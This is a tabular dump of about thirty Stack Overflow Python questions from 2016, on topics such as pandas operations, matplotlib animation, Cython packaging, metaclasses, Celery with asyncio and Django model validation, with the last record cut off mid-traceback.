40101130,2336654.0,2016-10-18 06:35:34+00:00,4,how do I calculate a rolling idxmax,"<p>consider the <code>pd.Series</code> <code>s</code></p>

<pre><code>import pandas as pd
import numpy as np

np.random.seed([3,1415])
s = pd.Series(np.random.randint(0, 10, 10), list('abcdefghij'))
s

a    0
b    2
c    7
d    3
e    8
f    7
g    0
h    6
i    8
j    6
dtype: int64
</code></pre>

<p>I want to get the index for the max value for the rolling window of 3</p>

<pre><code>s.rolling(3).max()

a    NaN
b    NaN
c    7.0
d    7.0
e    8.0
f    8.0
g    8.0
h    7.0
i    8.0
j    8.0
dtype: float64
</code></pre>

<p>What I want is</p>

<pre><code>a    None
b    None
c       c
d       c
e       e
f       e
g       e
h       f
i       i
j       i
dtype: object
</code></pre>

<p>What I've done</p>

<pre><code>s.rolling(3).apply(np.argmax)

a    NaN
b    NaN
c    2.0
d    1.0
e    2.0
f    1.0
g    0.0
h    0.0
i    2.0
j    1.0
dtype: float64
</code></pre>

<p>which is obviously not what I want</p>
"
40141881,2336654.0,2016-10-19 21:34:18+00:00,4,pandas groupby transform behaving differently with seemingly equivalent representations,"<p>consider the <code>df</code></p>

<pre><code>df = pd.DataFrame(dict(A=['a', 'a'], B=[0, 1]))
</code></pre>

<p>I expected the following two formulations to be equivalent.</p>

<p><strong><em>formulation 1</em></strong>  </p>

<pre><code>df.groupby('A').transform(np.mean)
</code></pre>

<p><a href=""https://i.stack.imgur.com/euRkW.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/euRkW.png"" alt=""enter image description here""></a></p>

<p><strong><em>formulation 2</em></strong></p>

<pre><code>df.groupby('A').transform(lambda x: np.mean(x))
</code></pre>

<p><a href=""https://i.stack.imgur.com/18pe5.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/18pe5.png"" alt=""enter image description here""></a></p>

<p>I'd consider the results from <strong><em>formulation 2</em></strong> incorrect.  But before I go crying <em>bug</em> maybe someone has a rational explanation for it.</p>
"
40033948,6950698.0,2016-10-14 02:25:45+00:00,4,Arrow animation in Python,"<p>First of all, I am just starting to learn Python. I have been struggling during the last hours trying to update the arrow properties in order to change them during a plot animation.</p>

<p>After thoroughly looking for an answer, I have checked that it is possible to change a circle patch center by modifying the attribute 'center' such as <code>circle.center = new_coordinates</code>. However, I don't find the way to extrapolate this mechanism to an arrow patch...</p>

<p>The code so far is:</p>

<pre><code>import numpy as np, math, matplotlib.patches as patches
from matplotlib import pyplot as plt
from matplotlib import animation

# Create figure
fig = plt.figure()    
ax = fig.gca()

# Axes labels and title are established
ax = fig.gca()
ax.set_xlabel('x')
ax.set_ylabel('y')

ax.set_ylim(-2,2)
ax.set_xlim(-2,2)
plt.gca().set_aspect('equal', adjustable='box')

x = np.linspace(-1,1,20) 
y  = np.linspace(-1,1,20) 
dx = np.zeros(len(x))
dy = np.zeros(len(y))

for i in range(len(x)):
    dx[i] = math.sin(x[i])
    dy[i] = math.cos(y[i])
patch = patches.Arrow(x[0], y[0], dx[0], dy[0] )


def init():
    ax.add_patch(patch)
    return patch,

def animate(t):
    patch.update(x[t], y[t], dx[t], dy[t])   # ERROR
    return patch,

anim = animation.FuncAnimation(fig, animate, 
                               init_func=init, 
                               interval=20,
                               blit=False)

plt.show()
</code></pre>

<p>After trying several options, I thought that the function update could somehow take me closer to the solution. However, I get the error:</p>

<pre><code>TypeError: update() takes 2 positional arguments but 5 were given
</code></pre>

<p>If I just add one more patch per step by defining the animate function as shown below, I get the result shown in the image attached.</p>

<pre><code>def animate(t):
    patch = plt.Arrow(x[t], y[t], dx[t], dy[t] )
    ax.add_patch(patch)
    return patch,
</code></pre>

<p><a href=""https://i.stack.imgur.com/fE2B1.png"" rel=""nofollow"">Wrong animation</a></p>

<p>I have tried to add a patch.delete statement and create a new patch as update mechanism but that results in an empty animation...</p>

<p>I would be really grateful if anyone could bring some fresh air to this issue :)</p>

<p>Thanks in advance!</p>
"
39730524,1895062.0,2016-09-27 17:05:40+00:00,4,Create a subclass of list without deep copy,"<p>I want to subclass <code>list</code> to add some function to it, for example, <code>my_func</code>. </p>

<p>Is there a way to do this without copying the whole list, i.e. make a shallow copy, on the creation of the <code>MyList</code> object and let <code>MyList</code> reference the same list as the one used to construct it?</p>

<pre><code>class MyList(list):
    def my_func(self):
        # do some stuff
        return self


l1 = list(range(10))
l2 = MyList(l1)

print(l1)
print(l2)

l1[3] = -5

print(l1)
print(l2)
</code></pre>
"
39883994,6739448.0,2016-10-05 21:29:01+00:00,4,How can I append this elements to an array in python?,"<pre><code>input_elements = [""a"", ""b"", ""c"", ""d""]
my_array = [""1"", ""2"", ""3"", ""4""]
</code></pre>

<p>the output I want is:</p>

<pre><code>[""1"", ""2"", ""3"", ""4"", ""a""]
[""1"", ""2"", ""3"", ""4"", ""b""]
[""1"", ""2"", ""3"", ""4"", ""c""]
[""1"", ""2"", ""3"", ""4"", ""d""]
</code></pre>

<p>I tried:</p>

<pre><code>for e in input_elements:
  my_array.append(e)
</code></pre>

<p>I know the code right above is wrong, so I am wondering how I can generate the output like that.</p>
"
39590187,2387626.0,2016-09-20 09:18:05+00:00,4,"In requirements.txt, what does tilde equals (~=) mean?","<p>In the <code>requirements.txt</code> for a Python library I am using, one of the requirements is specified like:</p>

<pre><code>mock-django~=0.6.10
</code></pre>

<p>What does <code>~=</code> mean?</p>
"
39646097,459780.0,2016-09-22 18:13:08+00:00,4,Bundling C++ extension headers with a Python package source distribution,"<p>I'm writing a Cython wrapper to a C++ library that I would like to distribute as a Python package. I've come up with a dummy version of my package that looks like this (full source <a href=""https://github.com/standage/packagetest"" rel=""nofollow"">here</a>).</p>

<pre><code>$ tree
.
âââ bogus.pyx
âââ inc
âÂ Â  âââ bogus.hpp
âââ setup.py
âââ src
    âââ bogus.cpp
$
$ cat inc/bogus.hpp 
#ifndef BOGUS
#define BOGUS

class bogus
{
protected:
    int data;

public:
    bogus();
    int get_double(int value);
};

#endif
$
$ cat src/bogus.cpp 
#include ""bogus.hpp""

bogus::bogus() : data(0)
{

}

int bogus::get_double(int value)
{
    data = value * 2;
    return data;
}
$ cat bogus.pyx 
# distutils: language = c++
# distutils: sources = src/bogus.cpp
# cython: c_string_type=str, c_string_encoding=ascii

cdef extern from 'bogus.hpp':
    cdef cppclass bogus:
        bogus() except +
        int get_double(int value)

cdef class Bogus:
    cdef bogus b
    def get_double(self, int value):
        return self.b.get_double(value)
</code></pre>

<p>With the following <code>setup.py</code> file, I can can confirm that the library installs correctly with <code>python setup.py install</code> and that it works correctly.</p>

<pre><code>from setuptools import setup, Extension
import glob

headers = list(glob.glob('inc/*.hpp'))

bogus = Extension(
    'bogus',
    sources=['bogus.pyx', 'src/bogus.cpp'],
    include_dirs=['inc/'],
    language='c++',
    extra_compile_args=['--std=c++11', '-Wno-unused-function'],
    extra_link_args=['--std=c++11'],
)

setup(
    name='bogus',
    description='Troubleshooting Python packaging and distribution',
    author='Daniel Standage',
    ext_modules=[bogus],
    install_requires=['cython'],
    version='0.1.0'
)
</code></pre>

<p>However, when I build a source distribution using <code>python setup.py sdist build</code>, the C++ header files are not included and the C++ extension cannot be compiled.</p>

<p><strong>How can I make sure the C++ header files get bundled with the source distribution?!?!</strong></p>

<p>&lt;rant&gt;</p>

<p>Troubleshooting this has uncovered a tremendously convoluted and inconsistent mess of documentation, suggestions, and hacks, none of which have worked for me. Put a <code>graft</code> line in <code>MANIFEST.in</code>? Nope. The <code>package_data</code> or <code>data_files</code> options? Nope. Python packaging seems to have improved a lot in the last few years, but it is still nigh impenetrable for those of us that don't live and breathe Python packaging!</p>

<p>&lt;/rant&gt;</p>
"
40119050,5584020.0,2016-10-18 22:22:16+00:00,3,"Python: Pandas, dealing with spaced column names","<p>If I have multiple text files that I need to parse that look like so, but can vary in terms of column names, and the length of the hashtags above: <img src=""https://s4.postimg.org/8p69ptj9p/feafdfdfdfdf.png"" alt=""txt.file""></p>

<p>How would I go about turning this into a pandas dataframe? I've tried using     <code>pd.read_table('file.txt', delim_whitespace = True, skiprows = 14)</code>, but it has all sorts of problems. My issues are... </p>

<p>All the text, asterisks, and pounds at the top needs to be ignored, but I can't just use skip rows because the size of all the junk up top can vary in length in another file. </p>

<p>The columns ""stat (+/-)"" and ""syst (+/-)"" are seen as 4 columns because of the whitespace.</p>

<p>The one pound sign is included in the column names, and I don't want that. I can't just assign the column names manually because they vary from text file to text file.</p>

<p>Any help is much obliged, I'm just not really sure where to go from after I read the file using pandas.</p>
"
40055177,7022114.0,2016-10-15 05:07:22+00:00,3,Python: Why can't I assign new value to an array in this case?,"<pre><code>import numpy as np

data = np.array([['Height', 'Weight'],['165', '48'],['168', '50'],['173', '53']])
data[0,0] = data[0,0] + ""_1""
</code></pre>

<p><strong>data[0,0]</strong> is <strong>'Height'</strong>, and I want to replace it with <strong>'Height_1'</strong>. But the code above doesn't work. It returned the result as:</p>

<pre><code>data[0,0]
</code></pre>

<blockquote>
  <p>'Height'</p>
</blockquote>

<p>The <strong>data[0,0]</strong> element remained the same. And if I replace it directly without referring to itself, it still doesn't work.</p>

<pre><code>data[0,0] = ""Height"" + ""_1""
</code></pre>

<p>result:</p>

<pre><code>data[0,0]
</code></pre>

<blockquote>
  <p>'Height'</p>
</blockquote>

<p>But if I replace it with some characters other than <strong>""Height""</strong>, it works.</p>

<pre><code>data[0,0] = ""str"" + ""_1""
</code></pre>

<p>Result:</p>

<pre><code>data[0,0]
</code></pre>

<blockquote>
  <p>'str_1'</p>
</blockquote>

<p>I took this case to explain the problem I'm coming across. And in my work I have to refer to the array itself because I need to replace the elements which don't meet some requirements. Anyone have solutions on this? Thank you.</p>
"
40004871,194000.0,2016-10-12 17:33:00+00:00,3,pandas: get the value of the index for a row?,"<p>I have a dataframe:</p>

<pre><code>                 cost       month  para
prod_code
040201060AAAIAI    43  2016-01-01  0402
040201060AAAIAJ    45  2016-02-01  0402
040201060AAAIAI    46  2016-03-01  0402
040201060AAAIAI    41  2016-01-01  0402
040201060AAAIAI    48  2016-02-01  0402
</code></pre>

<p>How can I iterate over the rows, and get the value of the index for each one?</p>

<pre><code>d = { 'prod_code': ['040201060AAAIAI', '040201060AAAIAJ', '040201060AAAIAI', '040201060AAAIAI', '040201060AAAIAI', '040201060AAAIAI', '040301060AAAKAG', '040301060AAAKAK', '040301060AAAKAK', '040301060AAAKAX', '040301060AAAKAK', '040301060AAAKAK'], 'month': ['2016-01-01', '2016-02-01', '2016-03-01', '2016-01-01', '2016-02-01', '2016-03-01', '2016-01-01', '2016-02-01', '2016-03-01', '2016-01-01', '2016-02-01', '2016-03-01'], 'cost': [43, 45, 46, 41, 48, 59, 8, 9, 10, 12, 15, 13] }
df = pd.DataFrame.from_dict(d)
df.set_index('prod_code', inplace=True)
</code></pre>

<p>This is what I'm trying:</p>

<pre><code>for i, row in df.iterrows():
    print row.index, row['cost']
</code></pre>

<p>But I get this:</p>

<pre><code>Index([u'items', u'cost'], dtype='object') 3.34461552621
</code></pre>

<p>UPDATE: This is the same as asking how to get the name of the index for a series, but phrased differently. Also though the <em>answer</em> is the same as another question, the <em>question</em> is not the same! Specifically, this question will be found when people Google for ""pandas index of row"" rather than ""pandas name of series"". </p>
"
39815135,2448495.0,2016-10-02 08:17:22+00:00,3,Is it possible to capture any traceback generated by a Python application?,"<p>I've been searching google for a way to somehow capture any traceback generated by a Python application.</p>

<p>I'd like to send an email/slack/notification to myself if <em>any</em> error occurs which generates a traceback (instead of relying on users to report issues to me).</p>

<p>I still haven't found anything <a href=""http://code.activestate.com/recipes/442459-email-pretty-tracebacks-to-yourself-or-someone-you/"" rel=""nofollow"">which doesn't involve you doing a try/except</a>. But of course I can't put everything I do inside individual try/except clauses since I'm writing applications which launch a UI (PySide/PyQt4/PySide2/PyQt5) and could error on user interaction.</p>

<p>Is this possible, and if so how can I capture any traceback generated?</p>
"
39704367,871866.0,2016-09-26 13:35:38+00:00,3,Unable to use google-cloud in a GAE app,"<p>The following line in my Google App Engine app (<code>webapp.py</code>) fails to import the <a href=""https://googlecloudplatform.github.io/google-cloud-python/"" rel=""nofollow"">Google Cloud</a> library:</p>

<pre><code>from google.cloud import storage
</code></pre>

<p>With the following error:</p>

<pre><code>ImportError: No module named google.cloud.storage
</code></pre>

<p>I did some research and found the following articles to be helpful:</p>

<ul>
<li><a href=""https://cloud.google.com/appengine/docs/python/tools/using-libraries-python-27#installing_a_library"" rel=""nofollow"">https://cloud.google.com/appengine/docs/python/tools/using-libraries-python-27#installing_a_library</a></li>
<li><a href=""http://stackoverflow.com/a/34585485"">http://stackoverflow.com/a/34585485</a></li>
<li><a href=""https://www.simonmweber.com/2013/06/18/python-protobuf-on-app-engine.html"" rel=""nofollow"">https://www.simonmweber.com/2013/06/18/python-protobuf-on-app-engine.html</a></li>
</ul>

<p>Using a combination of the techniques suggested by the above articles, I did the following:</p>

<ol>
<li><p>Create a <code>requirements.txt</code> file:</p>

<pre><code>google-cloud==0.19.0
</code></pre></li>
<li><p>Import this library using <code>pip</code>:</p>

<pre><code>pip install -t lib -r requirements.txt
</code></pre></li>
<li><p>Use the following code in my <code>appengine_config.py</code> file:</p>

<pre><code>import os
import sys
import google
libDir = os.path.join(os.path.dirname(__file__), ""lib"")
google.__path__.append(os.path.join(libDir, ""google""))
sys.path.insert(0, libDir)
</code></pre></li>
</ol>

<p>Can anyone shed light on what I might be missing to get this working? I'm just trying to write a Google App Engine app that can write/read from Google Cloud Storage, and I'd like to test locally before deploying.</p>
"
39738504,3632002.0,2016-09-28 05:09:40+00:00,3,Return value from multiprocessing.Queue() in multiprocessing Python,"<p>I run a simple multiprocess program (the code below). I just make 2 processors, then initial a queue to store the result.</p>

<p>I wonder why with the same name <code>q</code>, but each time it prints out a different value.
I know the queue store 2 return values, from <code>pro1</code> and <code>pro2</code>. But I expected, it's something like: </p>

<pre><code>q = [1,2]
</code></pre>

<p>or</p>

<pre><code>q=[2,1] #depend on which one runs first
</code></pre>

<p>I can not figure out how one variable <code>q</code> can be 1, or 2.</p>

<p>It makes me so confused. 
Thank you.</p>

<p><strong>The code:</strong></p>

<pre><code>import multiprocessing


def run(ID, q):
    print(""Starting thread %s "" % (ID))

    q.put(ID)
    return None

if __name__ == '__main__':
    q = multiprocessing.Queue()  #store the result
    pro1 = multiprocessing.Process(target=run, args=(1,q))
    pro2 = multiprocessing.Process(target=run, args=(2,q))

    pro1.start()
    pro2.start()

    pro1.join()
    pro2.join()

    print(""q is "", q.get())
    print(""another q is "", q.get())
</code></pre>

<p><em>The result</em>:</p>

<pre><code>Starting thread 2 
Starting thread 1 
('q is ', 1)
('another q is ', 2)
</code></pre>
"
40012745,622508.0,2016-10-13 05:11:01+00:00,3,How to save a previous command line argument,"<p>I'm writing my first python command line tool using docopt and have run into an issue. </p>

<p>My structure is like this:</p>

<pre><code>Usage:
  my-tool configure
  my-tool [(-o &lt;option&gt; | --option &lt;option&gt;)]
  ...
</code></pre>

<p>I'm trying to find a way to run <code>my-tool -o foo-bar</code> first, and then optionally pass the value 'foo-bar' into my configure function if I run <code>my-tool configure</code> next. </p>

<p>In pseduocode, that translates to this:</p>

<pre><code>def configure(option=None):
    print option # With the above inputs this should print 'foo-bar'

def main():
    if arguments['configure']:
       configure(option=arguments['&lt;option&gt;'])
       return
    ...
</code></pre>

<p>Is there a way to get this working without changing the argument structure? 
I'm looking for a way to avoid <code>my-tool configure [(-o &lt;option&gt; | --option &lt;option&gt;)]</code></p>
"
39622059,6557479.0,2016-09-21 16:37:45+00:00,3,Slice numpy array to make it desired shaped,"<p>Surprisingly, couldn't find the answer across the internet. I have an n-dimensional numpy array. E.g.: 2-D np array:</p>

<pre><code>array([['34.5500000', '36.9000000', '37.3200000', '37.6700000'],
       ['41.7900000', '44.8000000', '48.2600000', '46.1800000'],
       ['36.1200000', '37.1500000', '39.3100000', '38.1000000'],
       ['82.1000000', '82.0900000', '76.0200000', '77.7000000'],
       ['48.0100000', '51.2500000', '51.1700000', '52.5000000', '55.2500000'],
       ['39.7500000', '39.5000000', '36.8100000', '37.2500000']], dtype=object)
</code></pre>

<p>As you can see, the 5th row consists of 5 elemnts and <strong>i want to make the 5th dissapear</strong>, using something like this:</p>

<pre><code>np.slice(MyArray, [6,4]) 
</code></pre>

<p>[6,4] is a shape. I really DO not want to iterate threw dimensions and cut them. I tried the <code>resize</code> method, but it returns nothing!</p>
"
39979358,6670276.0,2016-10-11 14:17:00+00:00,3,Python: store a value in a variable so that you can recognize each reoccurence,"<p>If this question is unclear, I am very open to constructive criticism. </p>

<p>I have an excel table with about 50 rows of data, with the first column in each row being a date. I need to access all the data for only one date, and that date appears only about 1-5 times. It is the most recent date so I've already organized the table by date with the most recent being at the top. </p>

<p>So my goal is to store that date in a variable and then have Python look only for that variable (that date) and take only the columns corresponding to that variable. I need to use this code on 100's of other excel files as well, so it would need to arbitrarily take the most recent date (always at the top though). </p>

<p>My current code below simply takes the first 5 rows because I know that's how many times this date occurs.</p>

<pre><code>import os
from numpy import genfromtxt
import pandas as pd

path = 'Z:\\folderwithcsvfile'

for filename in os.listdir(path):
    file_path = os.path.join(path, filename)
    if os.path.isfile(file_path):
        broken_df = pd.read_csv(file_path)
        df3 = broken_df['DATE']
        df4 = broken_df['TRADE ID']
        df5 = broken_df['AVAILABLE STOCK']
        df6 = broken_df['AMOUNT']
        df7 = broken_df['SALE PRICE']
        print (df3)
        #print (df3.head(6))
        print (df4.head(6))
        print (df5.head(6))
        print (df6.head(6))
        print (df7.head(6))
</code></pre>
"
39740109,3899919.0,2016-09-28 06:57:35+00:00,3,Outputting two graphs at once using matplotlib,"<p>In short, I want to write a function that will output a <a href=""http://pandas.pydata.org/pandas-docs/version/0.15.0/visualization.html#visualization-scatter-matrix"" rel=""nofollow"">scatter matrix</a> and <a href=""http://pandas.pydata.org/pandas-docs/stable/generated/pandas.DataFrame.boxplot.html"" rel=""nofollow"">boxplot</a> at one time in python. 
I figured I would do this by created a figure with a 2x1 plotting array. However when I run the code using a Jupyter notebook: </p>

<pre><code>def boxplotscatter(data):
    f, ax = plt.subplots(2, 1, figsize = (12,6))
    ax[0] = scatter_matrix(data, alpha = 0.2, figsize = (6,6), diagonal = 'kde')
    ax[1] = data.boxplot()
</code></pre>

<p>I get, using data called <code>pdf</code>: </p>

<p><a href=""http://i.stack.imgur.com/39v84.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/39v84.png"" alt=""enter image description here""></a></p>

<p>That isn't exactly what I expected -- I wanted to output the scatter matrix and below it the boxplot, not two empty grids and a boxplot embedded in a scatter matrix. </p>

<p>Thoughts on fixing this code?</p>
"
40031906,7014698.0,2016-10-13 22:13:40+00:00,3,"Is it possible to dynamically create a metaclass for a class with several bases, in Python 3?","<p>In Python 2, with a trick it is possible to create a class with several bases, although the bases have metaclasses that are <em>not</em> subclass of each other.</p>

<p>The trick is that these metaclasses have themselves a metaclass (name it a ""metametaclass""), and this metametaclass provides the metaclasses with a call method that dynamically creates a common sub-metaclass of the base metaclasses, if necessary. Eventually, a class results whose metaclass is the new sub-metaclass. Here is the code:</p>

<pre><code>&gt;&gt;&gt; class MetaMeta(type):
...     def __call__(mcls, name, bases, methods):
...         metabases = set(type(X) for X in bases)
...         metabases.add(mcls)
...         if len(metabases) &gt; 1:
...             mcls = type(''.join([X.__name__ for X in metabases]), tuple(metabases), {})
...         return mcls.__new__(mcls, name, bases, methods)
... 
&gt;&gt;&gt; class Meta1(type):
...     __metaclass__ = MetaMeta
... 
&gt;&gt;&gt; class Meta2(type):
...     __metaclass__ = MetaMeta
... 
&gt;&gt;&gt; class C1:
...     __metaclass__ = Meta1
... 
&gt;&gt;&gt; class C2:
...     __metaclass__ = Meta2
... 
&gt;&gt;&gt; type(C1)
&lt;class '__main__.Meta1'&gt;
&gt;&gt;&gt; type(C2)
&lt;class '__main__.Meta2'&gt;
&gt;&gt;&gt; class C3(C1,C2): pass
... 
&gt;&gt;&gt; type(C3)
&lt;class '__main__.Meta1Meta2'&gt;
</code></pre>

<p>This example (of course changing the syntax to <code>class C1(metaclass=Meta1)</code> etc) doesn't work in Python 3.</p>

<p><strong>Question 1:</strong> Do I understand correctly that in Python 2, first <code>C3</code> is constructed, using the metaclass of the first base, and an error would only result if <code>type(C3)</code> were not a common subclass of <code>type(C1)</code> and <code>type(C2)</code>, whereas in Python 3 the error is raised earlier?</p>

<p><strong>Question 2:</strong> (How) Is it possible to make the above example work in Python 3? I did try to use a subclass of <code>abc.ABCMeta</code> as metametaclass, but even though using a custom <code>__subclasscheck__</code> makes <code>issubclass(Meta1, Meta2)</code> return <code>True</code>, the creation of C3 would still result in an error.</p>

<p><strong>Note:</strong> Of course I could make Python 3 happy by statically defining <code>Meta1Meta2</code> and explicitly using it as a metaclass for <code>C3</code>. However, that's not what I want. I want that the common sub-metaclass is created dynamically.</p>
"
39979889,7001714.0,2016-10-11 14:40:46+00:00,3,"Pandas dataframe, each cell into list - more pythonic way?","<p>I have a pandas dataframe with columns and rows like this:</p>

<pre><code>    a   b   c   d  
a  40  15  25  35  

b  10  25  35  45

c  20  35  45  55

d  40  45  55  65
</code></pre>

<p>For all numbers > 30 I need an output like this:</p>

<pre><code>a, a, 40
a, d, 40
b, c, 35
b, d, 45
</code></pre>

<p>and so on.</p>

<p>Currently I am running a loop like this:</p>

<pre><code>    for i in df.columns:
        for j in df.index:
            if df[i][j] &gt; 30:
                a.append(i+"",""+j+"",""+str(df[i][j])"")
</code></pre>

<p>This works, but is very slow. Is there a more pythonic way to do this?</p>

<p>Thanks!</p>
"
39815771,336527.0,2016-10-02 09:51:23+00:00,3,How to combine Celery with asyncio?,"<p>How can I create a wrapper that makes celery tasks look like <code>asyncio.Task</code>? Or is there a better way to integrate Celery with <code>asyncio</code>?</p>

<p>@asksol, the creator of Celery, <a href=""https://news.ycombinator.com/item?id=11870293"" rel=""nofollow"">said this:</a>:</p>

<blockquote>
  <p>It's quite common to use Celery as a distributed layer on top of async I/O frameworks (top tip: routing CPU-bound tasks to a prefork worker means they will not block your event loop).</p>
</blockquote>

<p>But I could not find any code examples specifically for <code>asyncio</code> framework.</p>
"
39704084,6797779.0,2016-09-26 13:22:43+00:00,3,How to write a recursive function that takes a list and return the same list without vowels?,"<p>I am supposed to write a recursive function that takes a list of strings or a list of lists of strings and return the list without vowels, if found. Here is my attempt to solve it:</p>

<pre><code>def noVow(seq):
    keys = ['a','i','e','o','u','u']
    if not seq or not isinstance(seq, list) :
        return 
    else:
        if seq[0]  in keys:
            del seq[0]
            return (noVow(seq[0:]))
        else:
            return (noVow(seq[1:]))


li = [""b"", ""c"", ""d"",""a""]
print (noVow(li))
</code></pre>

<p>I am aware that the bug lies in my base case however I can't come up with the right base case. </p>

<p>Note that the recursive function has to be written in pure functional programming i.e. side effects are not allowed.</p>
"
40003559,6561247.0,2016-10-12 16:19:14+00:00,3,"python pandas, trying to find unique combinations of two columns and merging while summing a third column","<p>Hi I will show what im trying to do through examples:
I start with a dataframe like this:</p>

<pre><code>&gt; pd.DataFrame({'A':['a','a','a','c'],'B':[1,1,2,3], 'count':[5,6,1,7]})
    A   B   count
0   a   1   5
1   a   1   6
2   a   2   1
3   c   3   7
</code></pre>

<p>I need to find a way to get all the unique combinations between column A and B, and merge them. The count column should be added together between the merged columns, the result should be like the following:</p>

<pre><code>    A   B   count
0   a   1   11
1   a   2   1
2   c   3   7
</code></pre>

<p>Thans for any help.</p>
"
39778657,4589819.0,2016-09-29 19:38:24+00:00,3,Template View - kwargs and **kwargs,"<p>I am reading about Template views through a tutorial and some of the code kind of confused me. The author used this code sample</p>

<pre><code>from django.utils.timezone import now

class AboutUsView(TemplateView):
    template_name = 'about_us.html'

def get_context_data(self, **kwargs):
    context = super(AboutUsView, self).get_context_data(**kwargs)
    if now().weekday() &lt; 5 and 8 &lt; now().hour &lt; 18:
        context['open'] = True
    else:
        context['open'] = False
    return context
</code></pre>

<p>The thing that confused me syntactically was this statement</p>

<pre><code> context = super(AboutUsView, self).get_context_data(**kwargs)
</code></pre>

<p>if we already are receiving <code>**kwargs</code> then why are we passing it to the super function with ** (double start). I think we should pass it as </p>

<pre><code> context = super(AboutUsView, self).get_context_data(kwargs)
</code></pre>

<p>this is the contextMixin which is receiving this call.</p>

<pre><code>class ContextMixin(object):
    """"""
    A default context mixin that passes the keyword arguments received by
    get_context_data as the template context.
    """"""

    def get_context_data(self, **kwargs):
        if 'view' not in kwargs:
            kwargs['view'] = self
        return kwargs
</code></pre>

<p>From what I have read is that the use of <code>**kwargs</code> pretty much means that kwargs is currently a dictionary and needs to be converted to named-value. If that is correct then how can kwargs be a dictionary when its parameter is actually **kwargs. I hope my question makes sense. Please let me know if you would want me to rephrase this.</p>
"
39603571,4972716.0,2016-09-20 20:56:15+00:00,3,Key error in data-frame handling,"<p>I have a dataframe <code>stockData</code>.  A part example looks like:</p>

<pre><code>Name: BBG.XCSE.CARLB.S_LAST_ADJ    BBG.XCSE.CARLB.S_FX  .....
date
2015-09-11    0.1340                           490.763
2015-09-14    0.1340                           484.263
2015-09-15    0.1340                           484.755
2015-09-16    0.1340                           507.703
2015-09-17    0.1340                           514.104  .....
</code></pre>

<p>each column has a data type , dtype: float64</p>

<p>I am looping a static data dataframe which contans every name in my universe  and I iterate through this, then iterating through each day for each name (in this example the name is BBG.XCSE.CARLB.S but there are hundreds of names in reality) taking the column 'name_LAST_ADJ' and multiplying by the column 'name_FX'.<br>
the code that I am using looks like:</p>

<pre><code>for i, row in staticData.iterrows():

        unique_id = i

        #Create new column for the current name that will take the result of the following calculation
        stockData[unique_id+""_LAST_ADJ_EUR""] = np.nan

        #Perform calculation - this is where I get the KeyError when there is no data in the name_ADJ_LAST column.
        stockData[unique_id+""_LAST_ADJ_EUR""] = stockData[unique_id+""_FX""]*stockData[unique_id+""_LAST_ADJ""]


    return stockData
</code></pre>

<p>However sometimes the data does not exist (because there is no history for the name) and I receive a key error because the columns for the name are not in the data-frame.</p>

<p>With the above code I am trying to create an additional column called name_LAST_ADJ_EUR and when there is data it should look like:</p>

<pre><code>Name: BBG.XCSE.CARLB.S_LAST_ADJ    BBG.XCSE.CARLB.S_FX     BBG.XCSE.CARLB.S_LAST_ADJ_EUR
    date
    2015-09-11    0.1340                       490.763              65.762242
    2015-09-14    0.1340                       484.263              64.891242
    2015-09-15    0.1340                       484.755              64.95717
    2015-09-16    0.1340                       507.703              68.032202
    2015-09-17    0.1340                       514.104              68.889936
</code></pre>

<p>and when there is data no data in the name_LAST_ADJ column is there a way generate an NaN output for he column so it looks like:</p>

<pre><code>Name:      BBG.XCSE.CARLB.S_LAST_ADJ_EUR
    date
    2015-09-11    NaN    
    2015-09-14    NaN       
    2015-09-15    NaN       
    2015-09-16    NaN         
    2015-09-17    NaN        
</code></pre>

<p>I have tried using the following:</p>

<pre><code>stockData[unique_id+""_LAST_ADJ_EUR""] = np.where((stockData[unique_id+""_LAST_ADJ""] == np.nan),stockData[unique_id+""_LAST_ADJ_EUR""]='NaN',stockData[unique_id+""_LAST_ADJ_EUR""] = stockData[unique_id+""_FX""] * stockData[unique_id+""_LAST_ADJ""])
</code></pre>

<p>which would be fine if there was a column but when there is no column to reference it throws the KeyError exception.</p>

<p>Any help much appreciated</p>
"
39779488,5261044.0,2016-09-29 20:32:35+00:00,3,Transform dna alignment into numpy array using biopython,"<p>I have several DNA sequences that have been aligned and I would like to keep  only the bases that are variable at a specific position. </p>

<p>This maybe could be done if we first transform the alignment into an array. I tried using the code in the Biopython tutorial but it gives an error.</p>

<pre><code>import numpy as np
from Bio import AlignIO
alignment = AlignIO.parse(""ma-all-mito.fa"", ""fasta"")
align_array = np.array([list(rec) for rec in alignment], np.character)
print(""Array shape %i by %i"" % align_array.shape)
</code></pre>

<p>The error I get:</p>

<pre><code>Traceback (most recent call last):

File ""C:/select-snps.py"", line 8, in &lt;module&gt;
    print(""Array shape %i by %i"" % align_array.shape)
TypeError: not all arguments converted during string formatting
</code></pre>
"
39978375,6765392.0,2016-10-11 13:27:25+00:00,3,how to make a python module or fuction and use it while writing other programs?,"<p>There where many instances where i have to write large line of code over and over again in multiple programs. so i was wondering if i could write just one program, save it and then  call it in different programs like a function or a module.</p>

<p>An elementary example :- I write a program to check if a number is palindromic or not. Then i want to write a program to check if a number is a palindromic a prime, could i just call the first program and do the rest of the code to check if it is prime or not.</p>

<p>P.S I'm just a beginner at python or computer science for that matter and i use IDLE to do all my python programs.</p>
"
39739029,6884956.0,2016-09-28 05:54:37+00:00,3,Followup : missing required Charfield in django Modelform is saved as empty string and do not raise an error,"<p>If I try to save incomplete model instance in Django 1.10, I would expect Django to raise an error. It does not seem to be the case.</p>

<p>models.py:</p>

<pre><code>from django.db import models

class Essai(models.Model):
    ch1 = models.CharField(max_length=100, blank=False)
    ch2 = models.CharField(max_length=100, blank=False)
</code></pre>

<p>So I have two fields not allowed to be empty (default behavior, <code>NOT NULL</code> restriction is applied by Django at MySQL table creation). I expect Django to rase an error if one of the fields is not set before storing.</p>

<p>However, when I create an incomplete instance, the data is stored just fine:</p>

<pre><code>&gt;&gt;&gt; from test.models import Essai
&gt;&gt;&gt; bouh = Essai()
&gt;&gt;&gt; bouh.ch1 = ""some content for ch1""
&gt;&gt;&gt; bouh.save()
&gt;&gt;&gt; bouh.id
9
&gt;&gt;&gt; bouh.ch1
'some content for ch1'
&gt;&gt;&gt; bouh.ch2
''
&gt;&gt;&gt; 
</code></pre>

<p>I would have expected Django to raise an error. If I force <code>ch2</code> to <code>None</code>, however, it raises an error:</p>

<pre><code>&gt;&gt;&gt; bouh = Essai()
&gt;&gt;&gt; bouh.ch1 = ""some content for ch1""
&gt;&gt;&gt; bouh.ch2 = None
&gt;&gt;&gt; bouh.save()
Traceback (most recent call last):
  (...)
